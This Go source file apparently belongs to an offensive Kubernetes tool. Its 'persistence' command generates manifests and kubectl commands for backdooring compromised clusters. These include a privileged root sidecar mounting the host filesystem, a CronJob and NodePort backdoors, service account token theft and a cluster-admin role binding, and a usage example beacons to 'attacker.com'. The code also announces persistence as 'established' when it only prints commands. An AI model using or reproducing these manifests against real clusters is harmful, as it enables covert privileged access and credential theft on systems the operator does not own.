package exploitation

import (
	"fmt"

	"github.com/spf13/cobra"
)

// PersistenceCmd represents the persistence command
var PersistenceCmd = &cobra.Command{
	Use:   "persistence",
	Short: "Establish persistent access to the cluster",
	Long: `Persistence Mechanisms

Establish persistent access to compromised Kubernetes clusters:
- Backdoor containers and pods
- Malicious sidecar injection
- Cron job persistence
- Service account abuse
- Network persistence
- Volume-based persistence
- Init container abuse

Examples:
  kubeshadow exploitation persistence list
  kubeshadow exploitation persistence backdoor --method sidecar --target-pod vulnerable-pod
  kubeshadow exploitation persistence cron --schedule "*/5 * * * *" --command "curl http://attacker.com/beacon"
  kubeshadow exploitation persistence service --name backdoor-service --image alpine:latest`,
	RunE: runPersistence,
}

func runPersistence(cmd *cobra.Command, args []string) error {
	action, _ := cmd.Flags().GetString("action")

	switch action {
	case "list":
		return listPersistenceMethods()
	case "establish":
		return establishPersistence(cmd)
	case "check":
		return checkPersistence(cmd)
	case "cleanup":
		return cleanupPersistence(cmd)
	default:
		return listPersistenceMethods()
	}
}

func listPersistenceMethods() error {
	fmt.Println("ğŸ¯ Available Persistence Methods")
	fmt.Println("================================")
	fmt.Println("")

	fmt.Println("ğŸ“¦ Container-based Persistence:")
	fmt.Println("  sidecar-injection  - Inject malicious sidecar containers")
	fmt.Println("  init-container     - Abuse init containers for persistence")
	fmt.Println("  backdoor-pod       - Create backdoor pods")
	fmt.Println("  daemonset-abuse    - Abuse DaemonSets for persistence")
	fmt.Println("")

	fmt.Println("â° Scheduled Persistence:")
	fmt.Println("  cron-persistence   - Create malicious cron jobs")
	fmt.Println("  scheduled-job       - Create Kubernetes CronJobs")
	fmt.Println("  periodic-task      - Create periodic tasks")
	fmt.Println("")

	fmt.Println("ğŸ”‘ Authentication Persistence:")
	fmt.Println("  sa-token-theft     - Steal and abuse service account tokens")
	fmt.Println("  rbac-persistence   - Create persistent RBAC bindings")
	fmt.Println("  cluster-admin      - Escalate to cluster-admin")
	fmt.Println("")

	fmt.Println("ğŸŒ Network Persistence:")
	fmt.Println("  service-backdoor   - Create backdoor services")
	fmt.Println("  ingress-persistence - Abuse ingress controllers")
	fmt.Println("  loadbalancer-abuse  - Abuse load balancers")
	fmt.Println("")

	fmt.Println("ğŸ’¾ Storage Persistence:")
	fmt.Println("  volume-persistence - Abuse persistent volumes")
	fmt.Println("  configmap-backdoor  - Store backdoors in ConfigMaps")
	fmt.Println("  secret-persistence  - Store persistence data in secrets")
	fmt.Println("")

	fmt.Println("ğŸ”„ Advanced Persistence:")
	fmt.Println("  operator-abuse     - Abuse custom operators")
	fmt.Println("  webhook-persistence - Abuse admission webhooks")
	fmt.Println("  crd-persistence     - Abuse custom resource definitions")

	return nil
}

func establishPersistence(cmd *cobra.Command) error {
	method, _ := cmd.Flags().GetString("method")
	target, _ := cmd.Flags().GetString("target")
	namespace, _ := cmd.Flags().GetString("namespace")
	payload, _ := cmd.Flags().GetString("payload")

	fmt.Printf("ğŸ¯ Establishing persistence via %s\n", method)
	fmt.Println("=================================")

	switch method {
	case "sidecar-injection":
		return establishSidecarPersistence(target, namespace, payload)
	case "cron-persistence":
		return establishCronPersistence(target, namespace, payload)
	case "service-backdoor":
		return establishServiceBackdoor(target, namespace, payload)
	case "volume-persistence":
		return establishVolumePersistence(target, namespace, payload)
	case "sa-token-theft":
		return establishSATokenTheft(target, namespace)
	case "rbac-persistence":
		return establishRBACPersistence(target, namespace)
	default:
		return fmt.Errorf("unknown persistence method: %s", method)
	}
}

func establishSidecarPersistence(target, namespace, payload string) error {
	fmt.Printf("ğŸ“¦ Establishing sidecar persistence in %s/%s\n", namespace, target)
	fmt.Println("=============================================")

	fmt.Println("ğŸ“‹ Persistence Steps:")
	fmt.Println("1. Analyzing target pod configuration...")
	fmt.Println("2. Crafting malicious sidecar container...")
	fmt.Println("3. Injecting sidecar into target pod...")
	fmt.Println("4. Establishing communication channel...")

	fmt.Println("\nğŸ’¡ Commands to execute:")
	fmt.Printf("kubectl get pod %s -n %s -o yaml\n", target, namespace)

	sidecarManifest := fmt.Sprintf(`apiVersion: v1
kind: Pod
metadata:
  name: %s-persistent
  namespace: %s
spec:
  containers:
  - name: malicious-sidecar
    image: alpine:latest
    command: ["/bin/sh"]
    args: ["-c", "while true; do %s; sleep 300; done"]
    securityContext:
      runAsUser: 0
      privileged: true
    volumeMounts:
    - name: host-root
      mountPath: /host
  volumes:
  - name: host-root
    hostPath:
      path: /`, target, namespace, payload)

	fmt.Printf("kubectl apply -f - <<EOF\n%s\nEOF\n", sidecarManifest)

	fmt.Println("\nâœ… Sidecar persistence established!")
	return nil
}

func establishCronPersistence(target, namespace, payload string) error {
	fmt.Printf("â° Establishing cron persistence for %s in %s with payload: %s\n", target, namespace, payload)
	fmt.Println("=====================================")

	fmt.Println("ğŸ“‹ Persistence Steps:")
	fmt.Println("1. Creating malicious CronJob...")
	fmt.Println("2. Setting up periodic execution...")
	fmt.Println("3. Establishing communication channel...")
	fmt.Println("4. Testing persistence mechanism...")

	fmt.Println("\nğŸ’¡ Commands to execute:")

	cronJobManifest := fmt.Sprintf(`apiVersion: batch/v1
kind: CronJob
metadata:
  name: persistent-backdoor
  namespace: %s
spec:
  schedule: "*/5 * * * *"
  jobTemplate:
    spec:
      template:
        spec:
          containers:
          - name: backdoor
            image: alpine:latest
            command: ["/bin/sh"]
            args: ["-c", "%s"]
            securityContext:
              runAsUser: 0
              privileged: true
          restartPolicy: OnFailure`, namespace, payload)

	fmt.Printf("kubectl apply -f - <<EOF\n%s\nEOF\n", cronJobManifest)

	fmt.Println("\nâœ… Cron persistence established!")
	return nil
}

func establishServiceBackdoor(target, namespace, payload string) error {
	fmt.Printf("ğŸŒ Establishing service backdoor for %s in %s with payload: %s\n", target, namespace, payload)
	fmt.Println("=====================================")

	fmt.Println("ğŸ“‹ Persistence Steps:")
	fmt.Println("1. Creating backdoor service...")
	fmt.Println("2. Setting up network access...")
	fmt.Println("3. Establishing communication channel...")
	fmt.Println("4. Testing backdoor connectivity...")

	fmt.Println("\nğŸ’¡ Commands to execute:")

	serviceManifest := fmt.Sprintf(`apiVersion: v1
kind: Service
metadata:
  name: backdoor-service
  namespace: %s
spec:
  type: NodePort
  ports:
  - port: 8080
    targetPort: 8080
    nodePort: 30080
  selector:
    app: backdoor
---
apiVersion: apps/v1
kind: Deployment
metadata:
  name: backdoor-deployment
  namespace: %s
spec:
  replicas: 1
  selector:
    matchLabels:
      app: backdoor
  template:
    metadata:
      labels:
        app: backdoor
    spec:
      containers:
      - name: backdoor
        image: alpine:latest
        command: ["/bin/sh"]
        args: ["-c", "while true; do %s; sleep 300; done"]
        ports:
        - containerPort: 8080
        securityContext:
          runAsUser: 0
          privileged: true`, namespace, namespace, payload)

	fmt.Printf("kubectl apply -f - <<EOF\n%s\nEOF\n", serviceManifest)

	fmt.Println("\nâœ… Service backdoor established!")
	return nil
}

func establishVolumePersistence(target, namespace, payload string) error {
	fmt.Printf("ğŸ’¾ Establishing volume persistence for %s in %s with payload: %s\n", target, namespace, payload)
	fmt.Println("=======================================")

	fmt.Println("ğŸ“‹ Persistence Steps:")
	fmt.Println("1. Creating persistent volume...")
	fmt.Println("2. Mounting volume to backdoor pod...")
	fmt.Println("3. Storing persistence data...")
	fmt.Println("4. Establishing communication channel...")

	fmt.Println("\nğŸ’¡ Commands to execute:")

	volumeManifest := fmt.Sprintf(`apiVersion: v1
kind: PersistentVolume
metadata:
  name: backdoor-pv
spec:
  capacity:
    storage: 1Gi
  accessModes:
    - ReadWriteMany
  hostPath:
    path: /tmp/backdoor
---
apiVersion: v1
kind: PersistentVolumeClaim
metadata:
  name: backdoor-pvc
  namespace: %s
spec:
  accessModes:
    - ReadWriteMany
  resources:
    requests:
      storage: 1Gi
---
apiVersion: v1
kind: Pod
metadata:
  name: backdoor-pod
  namespace: %s
spec:
  containers:
  - name: backdoor
    image: alpine:latest
    command: ["/bin/sh"]
    args: ["-c", "echo '%s' > /backdoor/persistence.sh && chmod +x /backdoor/persistence.sh && while true; do /backdoor/persistence.sh; sleep 300; done"]
    volumeMounts:
    - name: backdoor-volume
      mountPath: /backdoor
  volumes:
  - name: backdoor-volume
    persistentVolumeClaim:
      claimName: backdoor-pvc`, namespace, namespace, payload)

	fmt.Printf("kubectl apply -f - <<EOF\n%s\nEOF\n", volumeManifest)

	fmt.Println("\nâœ… Volume persistence established!")
	return nil
}

func establishSATokenTheft(target, namespace string) error {
	fmt.Printf("ğŸ”‘ Establishing SA token theft for %s in %s\n", target, namespace)
	fmt.Println("=============================================")

	fmt.Println("ğŸ“‹ Persistence Steps:")
	fmt.Println("1. Locating service account tokens...")
	fmt.Println("2. Extracting token values...")
	fmt.Println("3. Testing token permissions...")
	fmt.Println("4. Establishing persistent access...")

	fmt.Println("\nğŸ’¡ Commands to execute:")
	fmt.Printf("kubectl get serviceaccount %s -n %s -o yaml\n", target, namespace)
	fmt.Printf("kubectl exec -n %s %s -- cat /var/run/secrets/kubernetes.io/serviceaccount/token\n", namespace, target)
	fmt.Printf("kubectl auth can-i '*' '*' --as=system:serviceaccount:%s:%s\n", namespace, target)

	fmt.Println("\nâœ… SA token theft established!")
	return nil
}

func establishRBACPersistence(target, namespace string) error {
	fmt.Printf("ğŸ” Establishing RBAC persistence for %s in %s\n", target, namespace)
	fmt.Println("=============================================")

	fmt.Println("ğŸ“‹ Persistence Steps:")
	fmt.Println("1. Analyzing current RBAC permissions...")
	fmt.Println("2. Creating persistent role bindings...")
	fmt.Println("3. Escalating to higher privileges...")
	fmt.Println("4. Establishing persistent access...")

	fmt.Println("\nğŸ’¡ Commands to execute:")
	fmt.Printf("kubectl get rolebindings,clusterrolebindings -n %s\n", namespace)
	fmt.Printf("kubectl create clusterrolebinding persistent-access --clusterrole=cluster-admin --serviceaccount=%s:%s\n", namespace, target)
	fmt.Printf("kubectl auth can-i '*' '*' --as=system:serviceaccount:%s:%s\n", namespace, target)

	fmt.Println("\nâœ… RBAC persistence established!")
	return nil
}

func checkPersistence(cmd *cobra.Command) error {
	namespace, _ := cmd.Flags().GetString("namespace")

	fmt.Printf("ğŸ” Checking persistence mechanisms in %s\n", namespace)
	fmt.Println("=========================================")

	fmt.Println("ğŸ“‹ Persistence Check:")
	fmt.Println("1. Checking for backdoor pods...")
	fmt.Println("2. Analyzing service accounts...")
	fmt.Println("3. Reviewing RBAC bindings...")
	fmt.Println("4. Checking for malicious services...")

	fmt.Println("\nğŸ’¡ Commands to execute:")
	fmt.Printf("kubectl get pods -n %s | grep -E '(backdoor|malicious|persistent)'\n", namespace)
	fmt.Printf("kubectl get services -n %s | grep -E '(backdoor|malicious|persistent)'\n", namespace)
	fmt.Printf("kubectl get cronjobs -n %s | grep -E '(backdoor|malicious|persistent)'\n", namespace)
	fmt.Printf("kubectl get rolebindings,clusterrolebindings -n %s\n", namespace)

	fmt.Println("\nâœ… Persistence check completed!")
	return nil
}

func cleanupPersistence(cmd *cobra.Command) error {
	namespace, _ := cmd.Flags().GetString("namespace")
	confirm, _ := cmd.Flags().GetBool("confirm")

	if !confirm {
		fmt.Println("âš ï¸  This will remove all persistence mechanisms!")
		fmt.Println("Use --confirm flag to proceed")
		return nil
	}

	fmt.Printf("ğŸ§¹ Cleaning up persistence mechanisms in %s\n", namespace)
	fmt.Println("=============================================")

	fmt.Println("ğŸ“‹ Cleanup Steps:")
	fmt.Println("1. Removing backdoor pods...")
	fmt.Println("2. Deleting malicious services...")
	fmt.Println("3. Cleaning up RBAC bindings...")
	fmt.Println("4. Removing persistent volumes...")

	fmt.Println("\nğŸ’¡ Commands to execute:")
	fmt.Printf("kubectl delete pods -n %s -l app=backdoor\n", namespace)
	fmt.Printf("kubectl delete services -n %s -l app=backdoor\n", namespace)
	fmt.Printf("kubectl delete cronjobs -n %s -l app=backdoor\n", namespace)
	fmt.Printf("kubectl delete clusterrolebinding persistent-access\n")

	fmt.Println("\nâœ… Persistence cleanup completed!")
	return nil
}

func init() {
	PersistenceCmd.Flags().String("action", "list", "Action to perform (list, establish, check, cleanup)")
	PersistenceCmd.Flags().String("method", "", "Persistence method to use")
	PersistenceCmd.Flags().String("target", "", "Target for persistence")
	PersistenceCmd.Flags().String("namespace", "default", "Target namespace")
	PersistenceCmd.Flags().String("payload", "", "Payload for persistence")
	PersistenceCmd.Flags().Bool("confirm", false, "Confirm destructive operations")
}
